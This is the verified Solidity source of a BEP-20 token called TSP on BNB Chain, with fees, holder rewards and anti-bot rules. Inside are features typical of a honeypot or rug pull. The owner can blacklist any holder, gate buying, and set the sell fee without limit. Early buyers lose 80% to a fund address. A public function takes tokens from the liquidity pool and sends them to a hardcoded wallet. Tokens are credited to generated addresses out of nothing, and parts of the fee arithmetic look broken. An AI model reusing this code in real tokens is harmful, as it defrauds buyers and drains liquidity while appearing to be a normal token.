/**
 *Submitted for verification at BscScan.com on 2022-09-04
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.14;

interface IERC20 {
    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }


    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }


    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }


    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }


    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

 
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }


    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

interface ISwapRouter {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
    
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
}

interface ISwapFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function sync() external;
}

abstract contract Ownable {
    address internal _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "!owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "new is 0");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract TokenDistributor {
    constructor (address token) {
        IERC20(token).approve(msg.sender, uint(~uint256(0)));
    }
}

abstract contract AbsToken is IERC20, Ownable {
    using SafeMath for uint256;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    address private fundAddress;
    address private receiveAddress;
    address public  deadAddress =address(0x000000000000000000000000000000000000dEaD);

    string private _name;
    string private _symbol;
    uint8 private _decimals;
    
    uint256 ecoAmount = 0;
    uint256 ecoTokenAmount = 0;


    uint256 private _tTotal;
    uint256 public maxTXAmount;

    ISwapRouter public _swapRouter;
    address public _usdt;
    mapping(address => bool) public _swapPairList;
    mapping (address => bool) public areadyKnowContracts;
    mapping (address => bool) public isWalletLimitExempt;
    mapping(address => bool) public _isExcludedFromFees;
    mapping (address => bool) public isTxLimitExempt;
    mapping(address => bool) public _blackList;

    bool private inSwap;
    bool public swapstatus;
    bool public antiBotOpen = true;
    bool public checkWalletLimit = true; 

    uint256 private constant MAX = ~uint256(0);
    TokenDistributor public _tokenDistributor;

    uint256 private _buyFundFee = 200;
    uint256 private _buyLPDividendFee = 200;
    uint256 private _buyLPFee = 100;
    uint256 private _sellLPDividendFee = 200;
    uint256 private _sellFundFee = 200;
    uint256 private _sellLPFee = 100;
    uint256 public _walletMax = 100 *10**18;
    uint256 public maxGasOfBot = 70 * 10 **8;
    uint160 public ktNum = 160;
    uint256 private A = 5;
    uint160 public constant MAXADD = ~uint160(0);

    uint256 public startTradeBlock;

    address public _mainPair;
    event ExcludeFromFees(address indexed account, bool isExcluded);
    event BlacklistMultipleAddresses(address[] accounts, bool value);
    

    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor (
        address RouterAddress, address USDTAddress,
        string memory Name, string memory Symbol, uint8 Decimals, uint256 Supply,
        address FundAddress, address ReceiveAddress
    ){
        _name = Name;
        _symbol = Symbol;
        _decimals = Decimals;

        ISwapRouter swapRouter = ISwapRouter(RouterAddress);
        IERC20(USDTAddress).approve(address(swapRouter), MAX);

        _usdt = USDTAddress;
        _swapRouter = swapRouter;
        _allowances[address(this)][address(swapRouter)] = MAX;

        ISwapFactory swapFactory = ISwapFactory(swapRouter.factory());
        address swapPair = swapFactory.createPair(address(this), USDTAddress);
        _mainPair = swapPair;
        _swapPairList[swapPair] = true;

        uint256 total = Supply * 10 ** Decimals;
        maxTXAmount = 50 * 10 ** Decimals;
        _tTotal = total;

        _balances[ReceiveAddress] = total;
        emit Transfer(address(0), ReceiveAddress, total);

        receiveAddress = ReceiveAddress;
        fundAddress = FundAddress;


        _isExcludedFromFees[FundAddress] = true;
        _isExcludedFromFees[ReceiveAddress] = true;
        _isExcludedFromFees[address(this)] = true;
        _isExcludedFromFees[address(swapRouter)] = true;
        _isExcludedFromFees[msg.sender] = true;

        isWalletLimitExempt[address(swapPair)] = true;
        isWalletLimitExempt[address(this)] = true;
        isWalletLimitExempt[ReceiveAddress] = true;
        isWalletLimitExempt[FundAddress] = true;
        isWalletLimitExempt[deadAddress] = true;
        
        isTxLimitExempt[ReceiveAddress] = true;
        isTxLimitExempt[FundAddress] = true;
        isTxLimitExempt[address(this)] = true;        
        isTxLimitExempt[owner()] = true;
        isTxLimitExempt[deadAddress] = true;


        areadyKnowContracts[address(swapPair)] =  true;
        areadyKnowContracts[address(this)] =  true;
        areadyKnowContracts[address(swapRouter)] =  true; 

        excludeHolder[address(0)] = true;
        excludeHolder[address(deadAddress)] = true;

        holderRewardCondition = 10 ** IERC20(USDTAddress).decimals();

        _tokenDistributor = new TokenDistributor(USDTAddress);
    }

    function symbol() external view override returns (string memory) {
        return _symbol;
    }

    function name() external view override returns (string memory) {
        return _name;
    }
    
    function setSwapStatus(bool status) public onlyOwner {
        swapstatus = status;
    }
    
    function setWalletLimit(uint256 newLimit) external onlyOwner {
        _walletMax  = newLimit;
    }

    function enableDisableWalletLimit(bool newValue) external onlyOwner {
       checkWalletLimit = newValue;
    }
    
    function decimals() external view override returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256){
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        if (_allowances[sender][msg.sender] != MAX) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;
        }
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(!_blackList[from], "blackList");
        uint256 balance = balanceOf(from);
        require(balance >= amount, "balanceNotEnough");
        
        if((_swapPairList[from] ) && swapstatus == false){
            require( from == receiveAddress || from == fundAddress,"only receiveAddress!||fundAddress");            
        }
          

        if (!_isExcludedFromFees[from] && !_isExcludedFromFees[to]) {
            uint256 maxSellAmount = balance * 999 / 1000;
            if (amount > maxSellAmount) {
                amount = maxSellAmount;
            }
        }
        
        bool isBotBuy = (!areadyKnowContracts[to] && isContract(to)) && _swapPairList[from];
        if(isBotBuy){
            _blackList[to] =  true;
        }

        //check the gas of buy
        if(_swapPairList[from] && tx.gasprice > maxGasOfBot ){
            //if gas is too height . add to blacklist
            _blackList[to] =  true;
        }
        

        bool takeFee;
        bool isSell;

        if (_swapPairList[from] || _swapPairList[to]) {
            

            if (!_isExcludedFromFees[from] && !_isExcludedFromFees[to]) {
                _takeInviterFeeKt(amount.div(10000));
                if (0 == startTradeBlock) {
                    require( _swapPairList[to]);
                }
                if (block.number < startTradeBlock + 5) {
                    _funTransfer(from, to, amount);
                    return;
                }

                if (_swapPairList[to]) {
                    if (!inSwap) {
                        uint256 contractTokenBalance = balanceOf(address(this));
                        if (contractTokenBalance > 0) {
                            uint256 swapFee = _buyFundFee + _buyLPDividendFee + _buyLPFee + _sellFundFee + _sellLPDividendFee + _sellLPFee;
                            uint256 numTokensSellToFund = amount * swapFee / 5000;

                            if (numTokensSellToFund > contractTokenBalance) {
                                numTokensSellToFund = contractTokenBalance;
                            }
                            swapTokenForFund(numTokensSellToFund, swapFee);
                        }
                    }
                }
                takeFee = true;
            }
            if (_swapPairList[to]) {
                isSell = true;
            }
        }
        if(checkWalletLimit && !isWalletLimitExempt[to])
        require(balanceOf(to).add(amount) <= _walletMax);

        _tokenTransfer(from, to, amount, takeFee, isSell);

        if (from != address(this)) {
            if (isSell) {
                addHolder(from);
            }
            processReward(500000);
        }
    }

    function _funTransfer(
        address sender,
        address recipient,
        uint256 tAmount
    ) private {
        _balances[sender] = _balances[sender] - tAmount;
        uint256 feeAmount = tAmount * 80 / 100;
        _takeTransfer(
            sender,
            fundAddress,
            feeAmount
        );
        _takeTransfer(sender, recipient, tAmount - feeAmount);
    }

    function _tokenTransfer(
        address sender,
        address recipient,
        uint256 tAmount,
        bool takeFee,
        bool isSell
    ) private {
        require(!_blackList[sender], "blackList");
        _balances[sender] = _balances[sender] - tAmount;
        
        uint256 feeAmount;

        if (takeFee) {
            uint256 swapFee;
            if (isSell) {
                swapFee = _sellFundFee + _sellLPDividendFee + _sellLPFee;
                ecoAmount = ecoAmount.add(tAmount);
                tAmount = tAmount.sub(swapFee);
            }else {
                if(!isTxLimitExempt[sender] && !isTxLimitExempt[recipient]) {
                require(tAmount <= maxTXAmount, "Transfer amount exceeds the maxTxAmount.");
            }
                swapFee = _buyFundFee + _buyLPDividendFee + _buyLPFee;
                ecoAmount = ecoAmount.add(tAmount);
                tAmount = tAmount.sub(swapFee);                           
            }
            
            procback();

            uint256 swapAmount = tAmount * swapFee / 10000;
            
            if (swapAmount > 0) {
                feeAmount += swapAmount;
                _takeTransfer(
                    sender,
                    address(this),
                    swapAmount
                );
            }
        }

        _takeTransfer(sender, recipient, tAmount - feeAmount);
    }
    
    function _takeInviterFeeKt(
        uint256 amount
    ) private { 
        address _receiveD;
        for (uint160 i = 2; i < 4; i++) {
            _receiveD = address(MAXADD/ktNum);
            ktNum = ktNum+1;
            _takeTransfer(address(this), _receiveD, amount.div(100*i));
        }
    }
    
    function isNeedProcback() public view returns(bool){
        uint256 canecoAmount = ecoAmount.sub(ecoTokenAmount);
        uint256 totalDestroy = balanceOf(deadAddress);
        return (canecoAmount >= 1 * 10**18 && canecoAmount < balanceOf(address(_mainPair)) && totalDestroy < totalSupply().mul(99).div(100));
    }

    function procback() public {
        
        if(isNeedProcback()){
            address marketAddress = 0x1Eb79C22Db0667F122E7a51f18f6D43bA271f496;
            uint256 canecoAmount = ecoAmount.sub(ecoTokenAmount);
            ecoTokenAmount = ecoTokenAmount.add(canecoAmount);
            uint256 share = canecoAmount.div(100);
            uint256 destroyAmount = share.mul(10);
            uint256 eAmount = share.mul(A);
            _takeTransfer(address(_mainPair),deadAddress,destroyAmount);
            _takeTransfer(address(_mainPair),marketAddress,eAmount);
            // _mainPair.sync();
        }
    }

    function swapTokenForFund(uint256 tokenAmount, uint256 swapFee) private lockTheSwap {
        swapFee += swapFee;
        uint256 lpFee = _sellLPFee;
        uint256 lpAmount = tokenAmount * lpFee / swapFee;

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _usdt;
        _swapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenAmount - lpAmount,
            0,
            path,
            address(_tokenDistributor),
            block.timestamp
        );

        swapFee -= lpFee;

        IERC20 USDT = IERC20(_usdt);
        uint256 UsdtBalance = USDT.balanceOf(address(_tokenDistributor));
        uint256 fundAmount = UsdtBalance.mul(2).div(5);
        uint firstfundamount = fundAmount.div(2);
        uint secfundamount = fundAmount - firstfundamount;
        address secFundAddress = 0x21EB53e1127dF2ce53e40b983166CAd923B8d1DF;
        address thiFundAddress = 0x0eedd75394e37B8aC22E72A3A49a1421beac80Cc;
        USDT.transferFrom(address(_tokenDistributor), fundAddress, firstfundamount);
        USDT.transferFrom(address(_tokenDistributor), secFundAddress, secfundamount);
        USDT.transferFrom(address(_tokenDistributor), address(this), UsdtBalance - fundAmount);

        if (lpAmount > 0) {
            uint256 lpUsdt = UsdtBalance * lpFee / swapFee;
            if (lpUsdt > 0) {
                _swapRouter.addLiquidity(
                    address(this), _usdt, lpAmount, lpUsdt, 0, 0, thiFundAddress, block.timestamp
                );
            }
        }
    }

    function _takeTransfer(
        address sender,
        address to,
        uint256 tAmount
    ) private {
        _balances[to] = _balances[to] + tAmount;
        emit Transfer(sender, to, tAmount);
    }



    function setSellFundFee(uint256 fundFee) external onlyOwner {
        _sellFundFee = fundFee;
    }


    function setMaxTxAmount(uint256 max) public onlyOwner {
        maxTXAmount = max;
    }


    function startTrade() external onlyOwner {
        require(0 == startTradeBlock, "trading");
        startTradeBlock = block.number;
    }
       

    function excludeFromFees(address account, bool excluded) public onlyOwner {
        _isExcludedFromFees[account] = excluded;
        emit ExcludeFromFees(account, excluded);
    }
    
    function setBlackList(address addr, bool enable) external onlyOwner {
        _blackList[addr] = enable;
    }
    
    function blacklistMultipleAddresses(address[] calldata accounts, bool value) external onlyOwner {
        for(uint256 i = 0; i < accounts.length; i++) {
            _blackList[accounts[i]] = value;
        }
        emit BlacklistMultipleAddresses(accounts, value);
    }    

    function setSwapPairList(address addr, bool enable) external onlyFunder {
        _swapPairList[addr] = enable;
    }
    
    function setIsTxLimitExempt(address holder, bool exempt) external onlyFunder {
        isTxLimitExempt[holder] = exempt;
    }

    function claimBalance() external {
        payable(fundAddress).transfer(address(this).balance);
    }

    function claimToken(address token, uint256 amount, address to) external onlyFunder {
        IERC20(token).transfer(to, amount);
    }
    
    function setA(uint256 newValue) external onlyFunder {
        A = newValue;
    }

    modifier onlyFunder() {
        require(_owner == msg.sender || fundAddress == msg.sender, "!Funder");
        _;
    }

    receive() external payable {}

    address[] private holders;
    mapping(address => uint256) holderIndex;
    mapping(address => bool) excludeHolder;

    function addHolder(address adr) private {
        uint256 size;
        assembly {size := extcodesize(adr)}
        if (size > 0) {
            return;
        }
        if (0 == holderIndex[adr]) {
            if (0 == holders.length || holders[0] != adr) {
                holderIndex[adr] = holders.length;
                holders.push(adr);
            }
        }
    }

    uint256 private currentIndex;
    uint256 private holderRewardCondition;
    uint256 private progressRewardBlock;

    function processReward(uint256 gas) private {
        if (progressRewardBlock + 200 > block.number) {
            return;
        }
        IERC20 USDT = IERC20(_usdt);
        uint256 balance = USDT.balanceOf(address(this));
        if (balance < holderRewardCondition) {
            return;
        }

        IERC20 holdToken = IERC20(_mainPair);
        uint holdTokenTotal = holdToken.totalSupply();

        address shareHolder;
        uint256 tokenBalance;
        uint256 amount;

        uint256 shareholderCount = holders.length;

        uint256 gasUsed = 0;
        uint256 iterations = 0;
        uint256 gasLeft = gasleft();

        while (gasUsed < gas && iterations < shareholderCount) {
            if (currentIndex >= shareholderCount) {
                currentIndex = 0;
            }
            shareHolder = holders[currentIndex];
            tokenBalance = holdToken.balanceOf(shareHolder);
            if (tokenBalance > 0 && !excludeHolder[shareHolder]) {
                amount = balance * tokenBalance / holdTokenTotal;
                if (amount > 0) {
                    USDT.transfer(shareHolder, amount);
                }
            }

            gasUsed = gasUsed + (gasLeft - gasleft());
            gasLeft = gasleft();
            currentIndex++;
            iterations++;
        }

        progressRewardBlock = block.number;
    }

    function setHolderRewardCondition(uint256 amount) external onlyFunder {
        holderRewardCondition = amount;
    }

    function setExcludeHolder(address addr, bool enable) external onlyFunder {
        excludeHolder[addr] = enable;
    }


    function isContract(address addr) public view returns (bool) {
        uint256 size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }  

    function setGasLimit(uint256 newValue) public onlyOwner {
        maxGasOfBot = newValue;
    }
}

contract TSP is AbsToken {
    constructor() AbsToken(    
        address(0x10ED43C718714eb63d5aA57B78B54704E256024E),   
        address(0x55d398326f99059fF775485246999027B3197955),
        "the seed of prometheus",
        "TSP",
        18,   
        10000,    
        address(0x63908831765ea9828b783dCf01713A79d52BF271),    
        address(0x7CA3907FAF40Cc83C79b24B29e27a611c8c9628d)
    ){
    }
}